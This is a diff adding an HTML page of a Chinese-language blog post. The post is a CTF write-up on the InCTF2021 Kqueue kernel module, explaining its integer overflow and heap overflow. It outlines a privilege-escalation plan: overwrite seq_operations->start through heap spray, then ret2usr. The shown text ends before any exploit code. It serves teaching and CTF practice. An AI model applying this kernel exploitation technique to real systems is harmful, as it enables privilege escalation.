@@ -1,0 +1,831 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jfif">
+  <link rel="icon" href="/img/logo.jfif">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="nqoinaen">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言 参考arttnba3，Roland 本篇为内核的堆溢出 InCTF2021 - Kqueue 解压打包要在root下进行，不然可能遇到各种奇怪的权限问题 0x01程序分析 只装载了这个LKM，按套路漏洞就在这里面  1.保护 开启了kaslr，没开启smep&#x2F;smap,KPTI 12345678910stty saneexec qemu-system-x86_64 \    -cpu kvm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0x06 kernel heap-Heap OverFlow">
+<meta property="og:url" content="https://nqoinaen.github.io/2022/11/19/0x06kernelheapoverflow/index.html">
+<meta property="og:site_name" content="nqoinaen&#39;s blog">
+<meta property="og:description" content="前言 参考arttnba3，Roland 本篇为内核的堆溢出 InCTF2021 - Kqueue 解压打包要在root下进行，不然可能遇到各种奇怪的权限问题 0x01程序分析 只装载了这个LKM，按套路漏洞就在这里面  1.保护 开启了kaslr，没开启smep&#x2F;smap,KPTI 12345678910stty saneexec qemu-system-x86_64 \    -cpu kvm">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://nqoinaen.github.io/img/img4.jpg">
+<meta property="article:published_time" content="2022-11-19T05:01:03.000Z">
+<meta property="article:modified_time" content="2022-11-19T15:39:53.372Z">
+<meta property="article:author" content="nqoinaen">
+<meta property="article:tag" content="kernel heap overflow">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://nqoinaen.github.io/img/img4.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>0x06 kernel heap-Heap OverFlow - nqoinaen&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"nqoinaen.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>nqoinaen&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/img4.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="0x06 kernel heap-Heap OverFlow"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-19 13:01" pubdate>
+          2022年11月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">0x06 kernel heap-Heap OverFlow</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年11月19日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言">前言</h2>
+<p>参考<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x05-Kernel-Heap-Heap-Overflow">arttnba3</a>，<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269031.htm">Roland</a> 本篇为内核的堆溢出</p>
+<h2 id="InCTF2021-Kqueue">InCTF2021 - Kqueue</h2>
+<p>解压打包要在root下进行，不然可能遇到各种奇怪的权限问题</p>
+<h3 id="0x01程序分析">0x01程序分析</h3>
+<p>只装载了这个LKM，按套路漏洞就在这里面</p>
+<p><img src="/2022/11/19/0x06kernelheapoverflow/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<h4 id="1-保护">1.保护</h4>
+<p>开启了kaslr，没开启smep/smap,KPTI</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">stty sane<br>exec qemu-system-x86_64 \<br>    -cpu kvm64 \<br>    -m 512 \<br>    -nographic \<br>    -kernel &quot;bzImage&quot; \<br>    -append &quot;console=ttyS0 oops=panic panic=-1 pti=off kaslr quiet&quot; \<br>    -monitor /dev/null \<br>    -initrd &quot;./rootfs.cpio&quot; \<br>    -s<br></code></pre></td></tr></table></figure>
+<h4 id="2-源码">2.源码</h4>
+<p>程序实现了在内核态的队列管理，数据结构学的稀烂，看麻了</p>
+<h5 id="一-结构体">一.结构体</h5>
+<p>定义了管理结构queue</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> data_size; <span class="hljs-comment">//每个queue_entry成员的大小</span><br>  <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">//一个队列总大小</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<span class="hljs-comment">//queue_entry的最大数量</span><br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure>
+<p>kqueues数组，也就是最多5个队列</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">queue</span> *kqueues[MAX_QUEUES] = &#123;(<span class="hljs-built_in">queue</span> *)<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure>
+<p>定义成员结构queue_entry</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">queue_entry *kqueue_entry;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span><br>  <span class="hljs-type">uint16_t</span> idx;<span class="hljs-comment">//entry的下标</span><br>  <span class="hljs-type">char</span> *data;<span class="hljs-comment">//当前entry维护的数据</span><br>  queue_entry *next; <span class="hljs-comment">//next指针,就是链表嘛</span><br>&#125;;<br></code></pre></td></tr></table></figure>
+<h5 id="二-create-kqueue">二.create_kqueue</h5>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br>    <span class="hljs-type">long</span> result = INVALID;<br><span class="hljs-comment">//队列数量不能大于5</span><br>    <span class="hljs-keyword">if</span>(queueCount &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Max queue count reached&quot;</span>);<br><span class="hljs-comment">//queue_entry最大数量不能为0</span><br>    <span class="hljs-keyword">if</span>(request.max_entries&lt;<span class="hljs-number">1</span>)<br>        err(<span class="hljs-string">&quot;[-] kqueue entries should be greater than 0&quot;</span>);<br><span class="hljs-comment">//queue_entry成员大小不能大于0x20</span><br>    <span class="hljs-keyword">if</span>(request.data_size&gt;MAX_DATA_SIZE)<br>        err(<span class="hljs-string">&quot;[-] kqueue data size exceed&quot;</span>);<br>    queue_entry *kqueue_entry;<br><span class="hljs-comment">//下面两个检查就是判断有无整数溢出</span><br>    ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br>    ull queue_size = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br><span class="hljs-comment">//一个队列总大小不能过0x10000</span><br>    <span class="hljs-keyword">if</span>(queue_size&gt;<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>) + <span class="hljs-number">0x10000</span>)<br>        err(<span class="hljs-string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);<br><br> <span class="hljs-comment">//所有检查完毕，开始分配内存</span><br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate((<span class="hljs-type">char</span> *)kmalloc(queue_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data = validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL));<br>    <span class="hljs-built_in">queue</span>-&gt;data_size   = request.data_size;<br>    <span class="hljs-built_in">queue</span>-&gt;max_entries = request.max_entries;<br>    <span class="hljs-built_in">queue</span>-&gt;queue_size  = queue_size;<br>    kqueue_entry = (queue_entry *)((<span class="hljs-type">uint64_t</span>)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>));<br>    queue_entry* current_entry = kqueue_entry;<br>    queue_entry* prev_entry = current_entry;<br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(i!=request.max_entries)<br>            prev_entry-&gt;next = <span class="hljs-literal">NULL</span>;<br>        current_entry-&gt;idx = i;<br>        current_entry-&gt;data = (<span class="hljs-type">char</span> *)(validate((<span class="hljs-type">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));<br>        current_entry += <span class="hljs-keyword">sizeof</span>(queue_entry)/<span class="hljs-number">16</span>;<br>        prev_entry-&gt;next = current_entry;<br>        prev_entry = prev_entry-&gt;next;<br>    &#125;<br><span class="hljs-comment">//遍历查找数组里有无空余的</span><br>    <span class="hljs-type">uint32_t</span> j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;MAX_QUEUES;j++)&#123;<br>        <span class="hljs-keyword">if</span>(kqueues[j] == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><span class="hljs-comment">//这里循环完j=5，不会执行if语句，我们能越界多分配一个队列</span><br>    <span class="hljs-keyword">if</span>(j&gt;MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] No kqueue slot left&quot;</span>);<br>    <span class="hljs-comment">/* Assign the newly created kqueue to the kqueues */</span><br>    kqueues[j] = <span class="hljs-built_in">queue</span>;<br>    queueCount++;<br>    result = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>程序用gcc内置函数<code>__builtin_umulll_overflow</code>检测乘法溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ull space = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(__builtin_umulll_overflow(<span class="hljs-keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="hljs-number">1</span>),&amp;space) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>检测<code>sizeof(queue_entry)</code>与<code>(request.max_entries+1)</code>相乘是否溢出,</p>
+<p>但是<code>request.max_entries</code>本身没有溢出检测</p>
+<p>在request_t结构的定义里它是32位无符号整型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>  <span class="hljs-type">uint32_t</span> max_entries;<br>  <span class="hljs-type">uint16_t</span> data_size;<br>  <span class="hljs-type">uint16_t</span> entry_idx;<br>  <span class="hljs-type">uint16_t</span> queue_idx;<br>  <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br></code></pre></td></tr></table></figure>
+<p><strong>存在整型溢出漏洞</strong>，如果我们输入一个极大值<code>0xffffffff</code>，那么加1后发生溢出，发生溢出变为0，从而通过了乘法检测，</p>
+<p>所以<code>request.max_entries</code>可以是0xffffffff这个极大值</p>
+<p>下一个检测<code>__builtin_saddll_overflow</code>因为space=0</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(__builtin_saddll_overflow(<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>),space,&amp;queue_size) == <span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>所以queue_size=sizeof(queue)</p>
+<p>值得一题的是因为<code>request.max_entries+1=0</code>，所以也没有进入循环，所以没有分配任何一个queue_entry成员</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">for</span><span class="hljs-params">(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)</span></span>&#123;<br>	.....<br>&#125;<br></code></pre></td></tr></table></figure>
+<h5 id="三-save-kqueue-entries">三.save_kqueue_entries</h5>
+<p>这里存在<strong>堆溢出漏洞</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;<br><span class="hljs-comment">//各种检查</span><br>    <span class="hljs-keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)<br>        err(<span class="hljs-string">&quot;[-] Invalid kqueue idx&quot;</span>);<br>    <span class="hljs-keyword">if</span>(isSaved[request.queue_idx]==<span class="hljs-literal">true</span>)<br>        err(<span class="hljs-string">&quot;[-] Queue already saved&quot;</span>);<br>    <span class="hljs-built_in">queue</span> *<span class="hljs-built_in">queue</span> = validate(kqueues[request.queue_idx]);<br>    <span class="hljs-keyword">if</span>(request.max_entries &lt; <span class="hljs-number">1</span> || request.max_entries &gt; <span class="hljs-built_in">queue</span>-&gt;max_entries)<br>        err(<span class="hljs-string">&quot;[-] Invalid entry count&quot;</span>);<br><span class="hljs-comment">//为需要保存的队列分配内存，由于我们的构造，这里只分配给new_queue一个小内存</span><br>    <span class="hljs-type">char</span> *new_queue = validate((<span class="hljs-type">char</span> *)kzalloc(<span class="hljs-built_in">queue</span>-&gt;queue_size,GFP_KERNEL));<br>    <span class="hljs-keyword">if</span>(request.data_size &gt; <span class="hljs-built_in">queue</span>-&gt;queue_size)<br>        err(<span class="hljs-string">&quot;[-] Entry size limit exceed&quot;</span>);<br><br><span class="hljs-comment">//拷贝到new_queue内存queue-&gt;data数据，长度是我们另定的request.data_size，所以存在溢出</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">queue</span>-&gt;data &amp;&amp; request.data_size)<br>        validate(<span class="hljs-built_in">memcpy</span>(new_queue,<span class="hljs-built_in">queue</span>-&gt;data,request.data_size));<br>    <span class="hljs-keyword">else</span><br>        err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>    new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br><br>    <span class="hljs-comment">/* Get to the entries of the kqueue */</span><br>    queue_entry *kqueue_entry = (queue_entry *)(<span class="hljs-built_in">queue</span> + (<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">queue</span>)+<span class="hljs-number">1</span>)/<span class="hljs-number">8</span>);<br><br><span class="hljs-comment">//如果我们按前面0xffffffff设置的话,拷贝循环是没进入的。这里的作用是拷贝kqueue_entry-&gt;data数据，长度也是我们自己定的request.data_size</span><br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)<br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));<br>        <span class="hljs-keyword">else</span><br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);<br>        kqueue_entry = kqueue_entry-&gt;next;<br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;<br>    &#125;<br><br>    <span class="hljs-comment">/* Mark the queue as saved */</span><br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h5 id="四-err">四.err</h5>
+<p>呃，其实这里err就printk一下，没有实质性作用，所以其实<strong>所有检测都是没用的</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">err</span><span class="hljs-params">(<span class="hljs-type">char</span>* msg)</span>&#123;<br>  printk(KERN_ALERT <span class="hljs-string">&quot;%s\n&quot;</span>,msg);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="0x02漏洞利用">0x02漏洞利用</h3>
+<h4 id="1-整型溢出">1.整型溢出</h4>
+<p>因为32位的无符号整型<code>request.max_entries=0xffffffff+1=0</code>存在溢出，我们传入</p>
+<p><code>0xffffffff</code>使其只分配一个 queue 和一个 data 而不分配 queue_entry的同时使得</p>
+<p><code>queue-&gt;max_entries = 0xffffffff</code>，此时我们的 queue-&gt;queue_size 便为 0x18</p>
+<h4 id="2-堆溢出-seq-operations结构体">2.堆溢出+seq-operations结构体</h4>
+<p>如果填入0xffffffff的话在 save_kqueue_entries()中会分配0x18大小的object给queue-&gt;queue_size，内存会从<code>kmalloc-32</code>中取，选取一个同样从kmalloc-32中分配的结构体，可以是 <strong>seq-operations</strong>,当我们打开stat文件（可以为/proc/self/stat）会在内核空间分配一个<strong>seq-operations</strong>结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure>
+<p>当我们read这个stat文件会调用proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，就会调用start函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>
+<p>所以我们要控制<strong>seq_operations-&gt;start</strong>指向我们的shllocde，在用read读取对应的stat文件触发即可</p>
+<h4 id="3-堆喷射">3.堆喷射</h4>
+<p><strong>堆喷射（heap spray）</strong>，多次分配相同的内存以确保我们能命中其中之一</p>
+<p>在这题中我们要在内核空间喷射足够多的<code>seq_operations</code> 结构体</p>
+<h4 id="4-ret2usr-ret2shellcode">4.ret2usr+ret2shellcode</h4>
